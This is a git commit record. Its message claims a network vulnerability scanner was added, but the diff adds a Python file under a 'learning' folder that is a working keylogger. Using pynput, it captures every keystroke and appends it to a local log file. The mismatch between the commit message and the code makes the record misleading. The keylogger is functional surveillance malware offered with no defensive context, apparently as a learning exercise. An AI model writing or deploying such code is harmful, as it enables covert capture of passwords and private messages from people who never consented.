c3315a8f88c83400370478133c8663c68c55329d
goal651 <bugiriwilson51@gmail.com>
2025-03-13 15:06:10 +0200

    feat: added network_vulunerability scanner

---
+++ learning/keylogger.py
@@ -0,0 +1,17 @@
+from pynput import keyboard
+
+def on_press(key):
+    try:
+        print(key.char)
+        with open("keylog.txt", "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        print(key)
+        with open("keylog.txt", "a") as f:
+            f.write(f"{key}")
+
+
+with keyboard.Listener(
+    on_press=on_press,
+) as listener:
+    listener.join()
